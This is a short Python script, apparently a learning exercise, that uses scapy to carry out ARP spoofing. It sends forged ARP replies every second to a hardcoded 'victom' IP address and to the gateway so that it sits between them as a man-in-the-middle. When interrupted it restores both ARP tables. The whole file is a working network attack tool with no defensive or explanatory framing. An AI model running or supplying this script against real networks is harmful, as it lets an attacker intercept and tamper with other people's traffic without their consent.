import scapy.all as scapy
#from scapy.all import Ether, ARP, srp, send
import time

import os
import sys


def get_mac1(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/ arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbos = False)[0]
    return answered_list[0][1].hwsrc

def get_mac(ip):
    '''return MAC address of any device connected to the network
    If ip is down return None'''
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/ arp_request
    answered_list, _ = scapy.srp(arp_request_broadcast, timeout=5)
    if answered_list:
        return answered_list[0][1].src


def spoof(target_ip, spoof_ip, verbose=True):
    '''
    Spoofs 'target_ip' saying that we are host_ip'''

    packet = scapy.ARP(op='is-at', pdst=target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
    scapy.send(packet, verbose = False)
    if verbose:
        #get the MAC address of the default interface we are using
        self_mac = scapy.ARP().hwsrc  
        print("[+] Sent to {} : {} is-at {}".format(target_ip, spoof_ip, self_mac))




def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst=destination_ip,
            hwdst = destination_mac,
            psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)



if __name__ == "__main__":
    #victom ip address
    target = '192.168.8.137'

    #gateway ip
    host = '192.168.8.243'

    verbose = True


    try:
        while True:
            #Telling the target that we are the host
            spoof(target, host, verbose)

            # Telling the host that we are the target
            spoof(host, target, verbose)

            # sleep for a second
            time.sleep(1)
            
            

    except KeyboardInterrupt:
        print("[!] Detexcted CTRL+C! restoring the network, please wait")

        restore(target, host)
        restore(host, target)
    


